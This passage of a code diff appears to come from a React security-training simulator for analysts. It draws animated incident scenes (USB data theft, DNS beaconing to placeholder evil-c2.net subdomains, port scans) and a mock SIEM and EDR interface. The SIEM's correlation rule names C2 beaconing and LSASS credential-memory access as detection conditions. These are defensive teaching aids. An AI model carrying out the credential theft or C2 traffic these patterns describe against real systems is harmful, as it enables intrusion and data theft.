+          ⚠ IMPOSSIBLE · 5 MINUTES · 6,000 KM
+        </div>
+      </div>
+    </div>
+  );
+
+  /* ── USB INSIDER ─────────────────────────────────────────── */
+  if(type==="usb") return (
+    <div style={{width:"100%",height:170,position:"relative",overflow:"hidden",
+      background:"linear-gradient(180deg,#080c14 0%,#0d1018 100%)",borderRadius:"0 0 8px 8px"}}>
+      <style>{css}</style>
+      <div style={{position:"absolute",top:20,left:"50%",transform:"translateX(-50%)",
+        display:"flex",alignItems:"center",gap:0,animation:"ia_float2 4s ease-in-out infinite"}}>
+        {/* Workstation */}
+        <div style={{background:"#111318",border:"1.5px solid #1e2533",borderRadius:8,
+          padding:"10px 14px",position:"relative",
+          boxShadow:"0 4px 30px rgba(0,0,0,0.5),0 0 0 1px rgba(251,191,36,0.1)"}}>
+          <div style={{fontSize:30,display:"block",textAlign:"center"}}>🖥</div>
+          <div style={{fontSize:7,color:"#6b7280",fontFamily:"monospace",textAlign:"center",
+            marginTop:3}}>WS-CORP-HR-012</div>
+          {/* USB port highlight */}
+          <div style={{position:"absolute",right:-5,top:"50%",transform:"translateY(-50%)",
+            width:5,height:14,background:"#fbbf24",borderRadius:"0 2px 2px 0",
+            opacity:0.8,boxShadow:"0 0 8px rgba(251,191,36,0.6)"}}/>
+        </div>
+
+        {/* USB device animating in */}
+        <div style={{animation:"ia_insert 2.5s ease-out infinite",marginLeft:-2}}>
+          <svg width="55" height="24" viewBox="0 0 55 24"
+            style={{filter:"drop-shadow(0 0 10px rgba(251,191,36,0.6))"}}>
+            <rect x="12" y="4" width="40" height="16" rx="3" fill="#fbbf24"/>
+            <rect x="0" y="6" width="14" height="12" rx="2" fill="#92400e"/>
+            <rect x="17" y="7" width="5" height="10" rx="1" fill="#451a03" opacity="0.4"/>
+            <rect x="25" y="7" width="5" height="10" rx="1" fill="#451a03" opacity="0.4"/>
+            <rect x="33" y="7" width="5" height="10" rx="1" fill="#451a03" opacity="0.4"/>
+            <text x="44" y="18" fill="#451a03" fontSize="9" opacity="0.6">⚡</text>
+          </svg>
+          <div style={{fontSize:7,color:"#fbbf24",fontFamily:"monospace",
+            textAlign:"center",fontWeight:700}}>PERSONAL USB</div>
+        </div>
+      </div>
+
+      {/* Data streaming out */}
+      <div style={{position:"absolute",right:"8%",top:20}}>
+        <div style={{fontSize:9,color:"#f87171",fontFamily:"monospace",
+          fontWeight:700,marginBottom:4}}>EXFIL DATA</div>
+        {["HR_salaries_2026.xlsx","employee_records.csv","strategy_Q3.docx","passwords.txt","vpn_config.ovpn"].map((f,i)=>(
+          <div key={i} style={{fontSize:7.5,color:"#fbbf24",fontFamily:"monospace",
+            display:"flex",alignItems:"center",gap:3,marginBottom:3,
+            animation:`ia_dataleakline 2s ${i*0.4}s ease-in infinite`}}>
+            <span style={{color:"#ef4444"}}>→</span> {f}
+          </div>
+        ))}
+      </div>
+
+      {/* Alert */}
+      <div style={{position:"absolute",bottom:8,left:"50%",transform:"translateX(-50%)",
+        background:"rgba(251,191,36,0.12)",border:"1px solid rgba(251,191,36,0.4)",
+        borderRadius:5,padding:"3px 10px",whiteSpace:"nowrap"}}>
+        <div style={{fontSize:7.5,color:"#fbbf24",fontFamily:"monospace",fontWeight:700,
+          animation:"ia_pulse 1.5s ease-in-out infinite"}}>
+          ⚠ DLP POLICY VIOLATION · DATA STAGING DETECTED
+        </div>
+      </div>
+    </div>
+  );
+
+  /* ── DNS BEACONING ──────────────────────────────────────── */
+  if(type==="dns") return (
+    <div style={{width:"100%",height:170,position:"relative",overflow:"hidden",
+      background:"linear-gradient(180deg,#060e0a 0%,#0a1412 100%)",borderRadius:"0 0 8px 8px"}}>
+      <style>{css}</style>
+      <div style={{position:"absolute",width:200,height:200,borderRadius:"50%",
+        background:"radial-gradient(circle,rgba(16,185,129,0.06) 0%,transparent 70%)",
+        top:"50%",left:"50%",transform:"translate(-50%,-50%)"}}/>
+
+      {/* Internal host */}
+      <div style={{position:"absolute",left:12,top:"50%",transform:"translateY(-50%)",
+        textAlign:"center",animation:"ia_float 4s ease-in-out infinite"}}>
+        <div style={{background:"#111318",border:"1px solid #1e2533",borderRadius:6,
+          padding:"6px 8px",marginBottom:3}}>
+          <div style={{fontSize:22}}>🖥</div>
+          <div style={{fontSize:6.5,color:"#4b5563",fontFamily:"monospace"}}>CORP-APP-01</div>
+        </div>
+      </div>
+
+      {/* DNS stream */}
+      <div style={{position:"absolute",left:80,right:80,top:0,bottom:0}}>
+        {["a1b2c3.evil-c2.net","d4e5f6.evil-c2.net","g7h8i9.evil-c2.net",
+          "j0k1l2.evil-c2.net","m3n4o5.evil-c2.net","p6q7r8.evil-c2.net"].map((domain,i)=>(
+          <div key={i} style={{position:"absolute",
+            top:`${10+i*14}%`,left:0,right:0,
+            textAlign:"center",
+            animation:`ia_stream 2.5s ${i*0.42}s linear infinite`}}>
+            <div style={{background:"rgba(16,185,129,0.1)",border:"1px solid rgba(16,185,129,0.3)",
+              borderRadius:3,padding:"1.5px 6px",display:"inline-block",
+              fontSize:7,color:"#34d399",fontFamily:"monospace"}}>
+              DNS → {domain}
+            </div>
+          </div>
+        ))}
+        {/* Center arrow */}
+        <div style={{position:"absolute",top:"50%",left:"50%",
+          transform:"translate(-50%,-50%)",
+          fontSize:10,color:"rgba(16,185,129,0.4)",letterSpacing:2}}>
+          ···
+        </div>
+      </div>
+
+      {/* C2 Server */}
+      <div style={{position:"absolute",right:12,top:"50%",transform:"translateY(-50%)",
+        textAlign:"center",animation:"ia_float 4s 2s ease-in-out infinite"}}>
+        <div style={{fontSize:26,animation:"ia_glow 2s ease-in-out infinite"}}>☠️</div>
+        <div style={{fontSize:7,color:"#ef4444",fontFamily:"monospace",fontWeight:700}}>C2 SERVER</div>
+        {[0,1,2].map(i=>(
+          <div key={i} style={{position:"absolute",width:40,height:40,borderRadius:"50%",
+            border:"1px solid rgba(220,38,38,0.3)",top:-7,left:-7,
+            animation:`ia_ping ${1.8}s ${i*0.6}s ease-out infinite`}}/>
+        ))}
+      </div>
+
+      {/* Stats */}
+      <div style={{position:"absolute",bottom:6,left:"50%",transform:"translateX(-50%)",
+        display:"flex",gap:8}}>
+        {[["847","DNS queries/hr"],["4.2/5","entropy"],["27","unique subdomains"]].map(([v,l])=>(
+          <div key={l} style={{textAlign:"center",background:"rgba(16,185,129,0.08)",
+            border:"1px solid rgba(16,185,129,0.2)",borderRadius:4,padding:"2px 6px"}}>
+            <div style={{fontSize:9,fontWeight:800,color:"#34d399",fontFamily:"monospace"}}>{v}</div>
+            <div style={{fontSize:5.5,color:"#4b5563",fontFamily:"monospace"}}>{l}</div>
+          </div>
+        ))}
+      </div>
+    </div>
+  );
+
+  /* ── RADAR (port scan, bruteforce, pentest) ──────────────── */
+  if(["portscan","bruteforce","pentest"].includes(type)) return (
+    <div style={{width:"100%",height:170,position:"relative",overflow:"hidden",
+      background:"linear-gradient(180deg,#060c0a 0%,#0a1018 100%)",borderRadius:"0 0 8px 8px",
+      display:"flex",alignItems:"center",justifyContent:"center"}}>
+      <style>{css}</style>
+
+      {/* Radar base */}
+      <div style={{position:"relative",width:130,height:130}}>
+        {/* Outer rings */}
+        {[130,95,60,30].map((d,i)=>(
+          <div key={d} style={{position:"absolute",
+            width:d,height:d,borderRadius:"50%",
+            border:`1px solid rgba(59,130,246,${0.08+i*0.04})`,
+            top:"50%",left:"50%",
+            transform:"translate(-50%,-50%)"}}/>
+        ))}
+        {/* Cross hairs */}
+        <div style={{position:"absolute",top:"50%",left:0,right:0,height:1,
+          background:"rgba(59,130,246,0.12)",transform:"translateY(-50%)"}}/>
+        <div style={{position:"absolute",left:"50%",top:0,bottom:0,width:1,
+          background:"rgba(59,130,246,0.12)",transform:"translateX(-50%)"}}/>
+
+        {/* Sweep */}
+        <div style={{position:"absolute",top:"50%",left:"50%",
+          width:65,height:65,transformOrigin:"0 0",
+          animation:"ia_radar 2.5s linear infinite"}}>
+          <div style={{position:"absolute",top:0,left:0,
+            width:65,height:65,
+            background:"conic-gradient(from 0deg,transparent 0deg,rgba(59,130,246,0.25) 60deg,transparent 80deg)",
+            borderRadius:"0 100% 0 0"}}/>
+          {/* Sweep line */}
+          <div style={{position:"absolute",top:0,left:0,width:65,height:2,
+            background:"linear-gradient(to right,rgba(59,130,246,0.8),transparent)",
+            transformOrigin:"0 1px",
+            boxShadow:"0 0 8px rgba(59,130,246,0.4)"}}/>
+        </div>
+
+        {/* Blips */}
+        {[[35,25,"#ef4444"],[68,55,"#ef4444"],[20,70,"#f59e0b"],
+          [85,35,"#ef4444"],[45,85,"#22c55e"],[75,75,"#f59e0b"]].map(([x,y,c],i)=>(
+          <div key={i} style={{position:"absolute",
+            left:`${x}%`,top:`${y}%`,
+            width:5,height:5,borderRadius:"50%",
+            background:c,transform:"translate(-50%,-50%)",
+            boxShadow:`0 0 6px ${c}`,
+            animation:`ia_ping2 ${1.5+i*0.3}s ${i*0.4}s ease-out infinite`}}/>
+        ))}
+
+        {/* Center dot */}
+        <div style={{position:"absolute",top:"50%",left:"50%",
+          width:6,height:6,borderRadius:"50%",background:"#3b82f6",
+          transform:"translate(-50%,-50%)",
+          boxShadow:"0 0 10px rgba(59,130,246,0.8)"}}/>
+      </div>
+
+      {/* Stats */}
+      <div style={{position:"absolute",bottom:6,left:"50%",
+        transform:"translateX(-50%)",
+        background:"rgba(59,130,246,0.08)",border:"1px solid rgba(59,130,246,0.2)",
+        borderRadius:6,padding:"3px 12px"}}>
+        <div style={{fontSize:8,color:"#60a5fa",fontFamily:"monospace",fontWeight:700,
+          letterSpacing:"0.1em",animation:"ia_blink 2s ease-in-out infinite"}}>
+          {type==="portscan"?"SCANNING 847 HOSTS · PORTS 22/80/443/3389":
+           type==="bruteforce"?"847 FAILED AUTH ATTEMPTS · 12 ACCOUNTS":
+           "PENTEST SCAN DETECTED · NMAP + MODULES"}
+        </div>
+      </div>
+    </div>
+  );
+
+  /* ── BEC / CLOUD / DEFAULT ───────────────────────────────── */
+  return (
+    <div style={{width:"100%",height:170,position:"relative",overflow:"hidden",
+      background:"linear-gradient(180deg,#080c14 0%,#0d1220 100%)",borderRadius:"0 0 8px 8px",
+      display:"flex",alignItems:"center",justifyContent:"center"}}>
+      <style>{css}</style>
+      <div style={{textAlign:"center",animation:"ia_float 3s ease-in-out infinite"}}>
+        <div style={{fontSize:64,animation:"ia_glow 2s ease-in-out infinite",
+          filter:"drop-shadow(0 0 20px rgba(220,38,38,0.5))"}}>
+          {type==="cloud"?"☁️":type==="bec"?"📧":"⚠️"}
+        </div>
+        <div style={{position:"absolute",top:4,right:"30%",fontSize:22}}>⚠️</div>
+        {[0,1,2].map(i=>(
+          <div key={i} style={{position:"absolute",top:"50%",left:"50%",
+            width:70,height:70,borderRadius:"50%",
+            border:"1.5px solid rgba(220,38,38,0.3)",
+            transform:"translate(-50%,-50%)",
+            animation:`ia_ping ${2}s ${i*0.7}s ease-out infinite`}}/>
+        ))}
+      </div>
+    </div>
+  );
+}
+
+
+
+
+function BlueTraceSIEM({inc,activeStep}){
+  const [tab,setTab]=useState("alerts");
+  const [sel,setSel]=useState(inc.siem.alerts[0].id);
+  const selAlert=inc.siem.alerts.find(a=>a.id===sel);
+  const stepTool=activeStep?.tool==="BlueTrace SIEM";
+
+  return(
+    <div style={{flex:1,display:"flex",flexDirection:"column",overflow:"hidden",background:"var(--bg)"}}>
+      {/* SIEM topbar */}
+      <div style={{background:"#0a0e1a",borderBottom:"1px solid var(--bd)",padding:"0 16px",height:42,display:"flex",alignItems:"center",gap:14,flexShrink:0}}>
+        <div style={{display:"flex",alignItems:"center",gap:7}}>
+          <div style={{width:20,height:20,borderRadius:4,background:"linear-gradient(135deg,#3b82f6,#1d4ed8)",display:"flex",alignItems:"center",justifyContent:"center",fontSize:9,fontWeight:800,color:"#fff",fontFamily:"var(--mo)"}}>BT</div>
+          <span style={{fontSize:12,fontWeight:700,color:"#60a5fa",fontFamily:"var(--mo)",letterSpacing:0.5}}>BlueTrace SIEM</span>
+          <span style={{fontSize:9,color:"var(--tx4)",fontFamily:"var(--mo)"}}>v4.2.1</span>
+        </div>
+        <div style={{flex:1,background:"var(--bg3)",border:"1px solid var(--bd)",borderRadius:5,padding:"4px 10px",display:"flex",alignItems:"center",gap:6}}>
+          <span style={{fontSize:10,color:"var(--tx4)",fontFamily:"var(--mo)"}}>🔍</span>
+          <span style={{fontSize:11,color:"var(--tx4)",fontFamily:"var(--mo)"}}>index=corp_events host={inc.host} | head 100</span>
+        </div>
+        <div style={{display:"flex",gap:8,alignItems:"center"}}>
+          <div style={{display:"flex",alignItems:"center",gap:5}}>
+            <Dot color="#22c55e" pulse/>
+            <span style={{fontSize:9.5,color:"var(--tx3)",fontFamily:"var(--mo)"}}>SIMULATION</span>
+          </div>
+          <div style={{fontSize:10,color:"var(--tx4)",fontFamily:"var(--mo)"}}>Corp · Primary Cluster</div>
+        </div>
+      </div>
+
+      {/* tabs */}
+      <div className="tool-row" style={{background:"var(--bg2)"}}>
+        {[["alerts","Alert Queue"],["correlation","Correlation Rule"],["raw","Raw Search"],["timeline","Timeline"]].map(([id,label])=>(
+          <button key={id} onClick={()=>setTab(id)} className={"tool-tab"+(tab===id?" on":"")}>{label}</button>
+        ))}
+        <div style={{flex:1}}/>
+        {stepTool&&<div style={{padding:"0 12px",display:"flex",alignItems:"center"}}><Badge color="blue">ACTIVE TOOL</Badge></div>}
+      </div>
+
+      <div style={{flex:1,overflow:"auto",padding:"14px",display:"flex",flexDirection:"column",gap:10}}>
+              {/* Guidance strip — tells user what to do */}
+              {stepTool&&<div style={{padding:"8px 12px",background:"rgba(59,130,246,0.1)",
+                borderBottom:"1px solid rgba(59,130,246,0.2)",display:"flex",alignItems:"center",gap:8}}>
+                <span style={{fontSize:16}}>{"👆"}</span>
+                <span style={{fontSize:12,fontWeight:600,color:"#60a5fa"}}>
+                  {"Click the CRITICAL alert row below — it is highlighted in red"}
+                </span>
+              </div>}
+
+        {tab==="alerts"&&(
+          <>
+            {/* incident banner */}
+            <div style={{background:"var(--critl)",border:"1px solid rgba(220,38,38,0.4)",borderRadius:8,padding:"10px 14px",display:"flex",gap:12,alignItems:"center"}}>
+              <Dot color="#dc2626" pulse/>
+              <div style={{flex:1}}>
+                <div style={{fontSize:11,fontWeight:700,color:"#fca5a5",fontFamily:"var(--mo)",marginBottom:2}}>{inc.id} — {inc.title}</div>
+                <div style={{fontSize:10.5,color:"#f87171",fontFamily:"var(--mo)"}}>Risk Score: <strong>{inc.siem.risk_score}/100</strong> · Rule: {inc.siem.correlation_rule} · Fired: {inc.siem.fired_at}</div>
+              </div>
+              <SevBadge s="Critical"/>
+            </div>
+
+            {/* alert table */}
+            <div style={{background:"var(--bg2)",border:"1px solid var(--bd)",borderRadius:8,overflow:"hidden"}}>
+              <div style={{display:"grid",gridTemplateColumns:"70px 1fr 90px 80px 55px",minWidth:360,background:"var(--bg3)",padding:"6px 12px",borderBottom:"1px solid var(--bd)"}}>
+                {["TIME","ALERT NAME","RULE","SOURCE","SEV"].map(h=>(
+                  <span key={h} style={{fontSize:8.5,fontWeight:700,color:"var(--tx4)",fontFamily:"var(--mo)",letterSpacing:"0.1em"}}>{h}</span>
+                ))}
+              </div>
+              {inc.siem.alerts.map((a,i)=>(
+                <div key={a.id} className={"clickrow"+(sel===a.id?" sel":"")} onClick={()=>setSel(a.id)}
+                  style={{display:"grid",gridTemplateColumns:"70px 1fr 90px 80px 55px",
+                    padding:a.sev==="Critical"?"11px 12px":"7px 12px",
+                    borderBottom:i<inc.siem.alerts.length-1?"1px solid var(--bd)":"none",
+                    alignItems:"center",
+                    background:sel===a.id?"rgba(59,130,246,0.08)":a.sev==="Critical"?"rgba(220,38,38,0.06)":"transparent",
+                    borderLeft:"3px solid "+(sel===a.id?"#3b82f6":a.sev==="Critical"?"#dc2626":a.sev==="High"?"#ea580c":"transparent"),
+                    transition:"all 0.15s"}}>
+                  <span style={{fontSize:10,color:"var(--tx4)",fontFamily:"var(--mo)"}}>{a.time}</span>
+                  <span style={{fontSize:12,color:sel===a.id?"var(--tx)":"var(--tx2)",fontWeight:sel===a.id?600:400,paddingRight:8}}>{a.msg.slice(0,52)+(a.msg.length>52?"...":"")}</span>
+                  <span style={{fontSize:9.5,color:"var(--ac)",fontFamily:"var(--mo)"}}>{a.rule.slice(0,14)}</span>
+                  <span style={{fontSize:9.5,color:"var(--tx4)",fontFamily:"var(--mo)"}}>{a.src}</span>
+                  <SevBadge s={a.sev}/>
+                </div>
+              ))}
+            </div>
+
+            {/* selected alert detail */}
+            {selAlert&&(
+              <div style={{background:"var(--bg2)",border:"1px solid var(--bd)",borderRadius:8,padding:"12px 14px",animation:"slideIn 0.2s ease"}}>
+                <div style={{display:"flex",alignItems:"center",gap:8,marginBottom:8}}>
+                  <div style={{fontSize:9,fontWeight:700,color:"var(--tx4)",fontFamily:"var(--mo)",letterSpacing:"0.1em",textTransform:"uppercase"}}>Alert Detail — {selAlert.id}</div>
+                  {selAlert.sev==="Critical"&&<div style={{fontSize:8,background:"rgba(220,38,38,0.15)",color:"#f87171",border:"1px solid rgba(220,38,38,0.3)",borderRadius:4,padding:"1px 6px",fontWeight:700,fontFamily:"var(--mo)",animation:"pulse 2s infinite"}}>⚠ NEEDS ACTION</div>}
+                </div>
+                <div style={{fontSize:13,color:"var(--tx1)",lineHeight:1.8,fontFamily:"var(--mo)",marginBottom:12,background:"rgba(255,255,255,0.02)",borderRadius:6,padding:"8px 10px",borderLeft:"2px solid "+(selAlert.sev==="Critical"?"#dc2626":selAlert.sev==="High"?"#ea580c":"var(--bd)")}}>{selAlert.msg}</div>
+                {selAlert.sev==="Critical"&&<div style={{fontSize:11,color:"#fbbf24",marginBottom:10,lineHeight:1.6,fontStyle:"italic"}}>{"This is a high-confidence indicator of active compromise. Read the full message, note the process chain and IP address."}</div>}
+                <div style={{display:"flex",gap:8,flexWrap:"wrap"}}>
+                  <Badge color="gray">Rule: {selAlert.rule}</Badge>
+                  <Badge color="blue">Source: {selAlert.src}</Badge>
+                  <Badge color="gray">Host: {inc.host}</Badge>
+                  <Badge color="gray">User: {inc.user}</Badge>
+                </div>
+              </div>
+            )}
+          </>
+        )}
+
+        {tab==="correlation"&&(
+          <div style={{background:"var(--bg2)",border:"1px solid var(--bd)",borderRadius:8,overflow:"hidden"}}>
+            <div style={{padding:"10px 14px",borderBottom:"1px solid var(--bd)",background:"var(--bg3)"}}>
+              <div style={{fontSize:11,fontWeight:700,color:"var(--tx2)",fontFamily:"var(--mo)"}}>{inc.siem.correlation_rule}</div>
+            </div>
+            <div style={{padding:"14px"}}>
+              <div style={{fontSize:10,color:"var(--tx4)",fontFamily:"var(--mo)",marginBottom:8,letterSpacing:"0.1em",textTransform:"uppercase"}}>Matched Conditions</div>
+              {[
+                ["Condition 1","EDR alert: OUTBOUND_C2_BEACON fired on same host","MATCH ✓"],
+                ["Condition 2","EDR alert: LSASS_MEMORY_ACCESS fired within 5 min","MATCH ✓"],
+                ["Condition 3","Email GW: macro attachment delivered to same user","MATCH ✓"],
+                ["Condition 4","Risk score > 90 on correlated host","MATCH ✓ (97)"],
+              ].map(([k,v,r])=>(
+                <div key={k} style={{display:"flex",justifyContent:"space-between",alignItems:"center",padding:"6px 10px",marginBottom:4,background:"var(--bg3)",borderRadius:5,border:"1px solid var(--bd)"}}>
+                  <div>
+                    <span style={{fontSize:10,fontWeight:700,color:"var(--tx3)",fontFamily:"var(--mo)",marginRight:8}}>{k}</span>
+                    <span style={{fontSize:12,color:"var(--tx2)"}}>{v}</span>
+                  </div>
+                  <span style={{fontSize:10,fontWeight:700,color:"var(--ok)",fontFamily:"var(--mo)"}}>{r}</span>
+                </div>
+              ))}
+              <div style={{marginTop:12,padding:"10px 12px",background:"var(--critl)",border:"1px solid rgba(220,38,38,0.3)",borderRadius:6}}>
+                <span style={{fontSize:11,fontWeight:700,color:"#fca5a5",fontFamily:"var(--mo)"}}>FINAL SCORE: 97/100 — Auto-promoted to CRITICAL</span>
+              </div>
+            </div>
+          </div>
+        )}
+
+        {tab==="raw"&&(
+          <div>
+            <div style={{background:"#0a0e1a",border:"1px solid var(--bd)",borderRadius:8,overflow:"hidden"}}>
+              <div style={{padding:"8px 12px",borderBottom:"1px solid var(--bd)",fontSize:10,fontWeight:700,color:"var(--tx4)",fontFamily:"var(--mo)",letterSpacing:"0.1em"}}>SEARCH — Last 24h — Corp Index</div>
+              <pre style={{padding:"12px",fontSize:11.5,color:"#93c5fd",fontFamily:"var(--mo)",lineHeight:1.8,overflow:"auto",whiteSpace:"pre-wrap"}}>{inc.siem.raw_search}</pre>
+            </div>
+            <div style={{marginTop:10,background:"var(--bg2)",border:"1px solid var(--bd)",borderRadius:8,padding:"12px"}}>
+              <div style={{fontSize:10,fontWeight:700,color:"var(--ok)",fontFamily:"var(--mo)",marginBottom:8}}>RESULTS — 1 host matched</div>
+              <div style={{display:"grid",gridTemplateColumns:"1fr 80px 1fr",background:"var(--bg3)",padding:"5px 10px",borderRadius:4,marginBottom:4,fontSize:9,fontWeight:700,color:"var(--tx4)",fontFamily:"var(--mo)"}}>
+                <span>HOST</span><span>MAX_RISK</span><span>RULES</span>
+              </div>
+              <div style={{display:"grid",gridTemplateColumns:"1fr 80px 1fr",padding:"6px 10px",background:"rgba(220,38,38,0.06)",border:"1px solid rgba(220,38,38,0.2)",borderRadius:4,fontSize:11.5,fontFamily:"var(--mo)"}}>
+                <span style={{color:"var(--err)"}}>{inc.host}</span>
+                <span style={{color:"var(--err)",fontWeight:700}}>97</span>
+                <span style={{color:"var(--tx3)",fontSize:10}}>OUTBOUND_C2_BEACON, LSASS_MEMORY_ACCESS, +4</span>
+              </div>
+            </div>
+          </div>
+        )}
+
+        {tab==="timeline"&&(
+          <div>
+            {inc.edr.timeline.map((ev,i)=>{
+              const c=ev.sev==="crit"?"#ef4444":ev.sev==="high"?"#f97316":ev.sev==="med"?"#eab308":"#6b7280";
+              return(
+                <div key={i} style={{display:"flex",gap:10,marginBottom:10,position:"relative",paddingLeft:20}}>
+                  <div style={{position:"absolute",left:0,top:4,width:10,height:10,borderRadius:"50%",background:c,boxShadow:"0 0 6px "+c+"60"}}/>
+                  {i<inc.edr.timeline.length-1&&<div style={{position:"absolute",left:4,top:14,bottom:-10,width:2,background:"var(--bd)",borderRadius:1}}/>}
+                  <div style={{flex:1}}>
+                    <div style={{display:"flex",gap:8,alignItems:"center",marginBottom:3}}>
+                      <span style={{fontSize:10,fontFamily:"var(--mo)",color:"var(--tx4)"}}>{ev.time}</span>
+                      <span style={{fontSize:9,fontWeight:700,padding:"0 5px",borderRadius:3,background:"var(--acl)",color:"var(--ac)",fontFamily:"var(--mo)"}}>{ev.src}</span>
+                    </div>
+                    <div style={{fontSize:12.5,color:ev.sev==="crit"?"#fca5a5":ev.sev==="high"?"#fdba74":"var(--tx2)",lineHeight:1.5}}>{ev.event}</div>
+                  </div>
+                </div>
+              );
+            })}
+          </div>
+        )}
+      </div>
+    </div>
+  );
+}
+
+
+function LearnThreatOpsEDR({inc,activeStep,isContained}){
+  const [tab,setTab]=useState("process");
+  const stepTool=activeStep?.tool==="LearnThreatOpsEDR";
+
+  return(
+    <div style={{flex:1,display:"flex",flexDirection:"column",overflow:"hidden",background:"var(--bg)"}}>
+      <div style={{background:"#0d0f1a",borderBottom:"1px solid var(--bd)",padding:"0 16px",height:42,display:"flex",alignItems:"center",gap:14,flexShrink:0}}>
+        <div style={{display:"flex",alignItems:"center",gap:7}}>
+          <div style={{width:20,height:20,borderRadius:4,background:"linear-gradient(135deg,#dc2626,#991b1b)",display:"flex",alignItems:"center",justifyContent:"center",fontSize:9,fontWeight:800,color:"#fff",fontFamily:"var(--mo)"}}>SE</div>
+          <span style={{fontSize:12,fontWeight:700,color:"#f87171",fontFamily:"var(--mo)",letterSpacing:0.5}}>LearnThreatOpsEDR</span>
+        </div>
+        <div style={{flex:1}}/>
+        <div style={{display:"flex",gap:8,alignItems:"center"}}>
+          <div style={{background:isContained?"rgba(34,197,94,0.15)":"rgba(239,68,68,0.12)",border:"1px solid "+(isContained?"rgba(34,197,94,0.4)":"rgba(239,68,68,0.35)"),borderRadius:5,padding:"3px 9px",fontSize:9.5,fontFamily:"var(--mo)",fontWeight:700,color:isContained?"#86efac":"#fca5a5"}}>
+            {isContained?"CONTAINED":"ACTIVE THREAT"}
+          </div>
+          <span style={{fontSize:10,color:"var(--tx4)",fontFamily:"var(--mo)"}}>Sensor: {inc.edr.sensor_id}</span>
+          {stepTool&&<Badge color="red">ACTIVE TOOL</Badge>}
+        </div>
+      </div>
+
+      <div className="tool-row" style={{background:"var(--bg2)"}}>
+        {[["process","Process Tree"],["network","Network"],["files","File Events"],["contain","Containment"]].map(([id,label])=>(
+          <button key={id} onClick={()=>setTab(id)} className={"tool-tab"+(tab===id?" on":"")}>{label}</button>
+        ))}
+      </div>
+
+      <div style={{flex:1,overflow:"auto",padding:"14px"}}>
+
+        {tab==="process"&&(
+          <div>
+            <div style={{background:"rgba(239,68,68,0.06)",border:"1px solid rgba(239,68,68,0.2)",borderRadius:7,padding:"8px 12px",marginBottom:12,fontSize:11,color:"#fca5a5",fontFamily:"var(--mo)"}}>
+              ⚠ Policy: {inc.edr.prevention_policy} — {inc.edr.policy_note}
+            </div>
+            {inc.edr.process_tree.map((p,i)=>{
+              const indent=p.depth*20;
+              return(
+                <div key={p.pid} style={{marginBottom:6,paddingLeft:indent}}>
+                  <div style={{display:"flex",alignItems:"flex-start",gap:6}}>
+                    {p.depth>0&&<span style={{color:"var(--bd2)",flexShrink:0,paddingTop:3,fontFamily:"var(--mo)",fontSize:12,lineHeight:1}}>└─</span>}
+                    <div style={{background:p.bad?"rgba(239,68,68,0.06)":"var(--bg2)",border:"1px solid "+(p.bad?"rgba(239,68,68,0.3)":"var(--bd)"),borderRadius:7,padding:"8px 12px",flex:1}}>
+                      <div style={{display:"flex",alignItems:"center",justifyContent:"space-between",marginBottom:4}}>
+                        <div style={{display:"flex",alignItems:"center",gap:7}}>
+                          <span style={{fontSize:12,fontWeight:700,color:p.bad?"#fca5a5":"var(--tx)",fontFamily:"var(--mo)"}}>{p.name}</span>
+                          {p.bad&&<span style={{background:"rgba(239,68,68,0.15)",color:"#f87171",border:"1px solid rgba(239,68,68,0.3)",padding:"0 5px",borderRadius:3,fontSize:8.5,fontWeight:700}}>MALICIOUS</span>}
+                          {p.score>0&&<span style={{background:p.score>80?"rgba(239,68,68,0.12)":p.score>50?"rgba(245,158,11,0.1)":"var(--bg4)",color:p.score>80?"#fca5a5":p.score>50?"var(--warn)":"var(--tx4)",border:"1px solid "+(p.score>80?"rgba(239,68,68,0.3)":p.score>50?"var(--warnb)":"var(--bd)"),padding:"0 5px",borderRadius:3,fontSize:8.5,fontWeight:700,fontFamily:"var(--mo)"}}>
+                            Score:{p.score}
+                          </span>}
+                        </div>
+                        <span style={{fontSize:9.5,color:"var(--tx4)",fontFamily:"var(--mo)"}}>{p.time}</span>
+                      </div>
+                      <div style={{fontSize:10,color:"var(--tx3)",lineHeight:1.55,wordBreak:"break-all",fontFamily:"var(--mo)",marginBottom:4}}>{p.cmd.length>80?p.cmd.slice(0,80)+"...":p.cmd}</div>
+                      <div style={{display:"flex",gap:10,fontSize:9.5,color:"var(--tx4)",fontFamily:"var(--mo)",flexWrap:"wrap"}}>
+                        <span>PID: {p.pid}</span>
+                        <span>PPID: {p.ppid}</span>
+                        <span>User: {p.user.split("\\").pop()}</span>
+                        {p.sha256&&<span style={{color:"#f87171"}}>SHA256: {p.sha256}...</span>}
+                      </div>
+                    </div>
+                  </div>
+                </div>
+              );
+            })}
+          </div>
+        )}
+
+        {tab==="network"&&(
+          <div>
+            {isContained&&<div style={{background:"var(--okl)",border:"1px solid var(--okb)",borderRadius:7,padding:"8px 12px",marginBottom:10,fontSize:11,color:"var(--ok)",fontFamily:"var(--mo)",fontWeight:600}}>HOST CONTAINED — All external network traffic blocked</div>}
+            <div style={{background:"var(--bg2)",border:"1px solid var(--bd)",borderRadius:8,overflow:"hidden"}}>
+              <div style={{display:"grid",gridTemplateColumns:"72px 1fr 1fr 70px 100px",background:"var(--bg3)",padding:"6px 12px",borderBottom:"1px solid var(--bd)"}}>
+                {["TIME","SOURCE","DESTINATION","PROTO","STATE"].map(h=>(
+                  <span key={h} style={{fontSize:8.5,fontWeight:700,color:"var(--tx4)",fontFamily:"var(--mo)",letterSpacing:"0.08em"}}>{h}</span>
+                ))}
+              </div>
+              {inc.edr.network.map((c,i)=>(
+                <div key={i} style={{display:"grid",gridTemplateColumns:"72px 1fr 1fr 70px 100px",padding:"7px 12px",borderBottom:i<inc.edr.network.length-1?"1px solid var(--bd)":"none",background:c.bad?"rgba(239,68,68,0.04)":"transparent",alignItems:"center"}}>
+                  <span style={{fontSize:9.5,color:"var(--tx4)",fontFamily:"var(--mo)"}}>{c.time}</span>
+                  <span style={{fontSize:10.5,color:"var(--tx3)",fontFamily:"var(--mo)"}}>{c.src}</span>
+                  <span style={{fontSize:10.5,color:c.bad?"#fca5a5":"var(--tx3)",fontFamily:"var(--mo)",fontWeight:c.bad?600:400}}>{c.dst}</span>
+                  <span style={{fontSize:10.5,color:"#60a5fa",fontFamily:"var(--mo)",fontWeight:600}}>{c.proto}</span>
+                  <span style={{fontSize:10,fontWeight:700,padding:"1px 6px",borderRadius:3,fontFamily:"var(--mo)",background:(isContained&&c.state==="ESTABLISHED")?"var(--bg4)":c.state==="ESTABLISHED"?"rgba(239,68,68,0.12)":"var(--bg4)",color:(isContained&&c.state==="ESTABLISHED")?"var(--tx4)":c.state==="ESTABLISHED"?"#fca5a5":"var(--tx4)"}}>
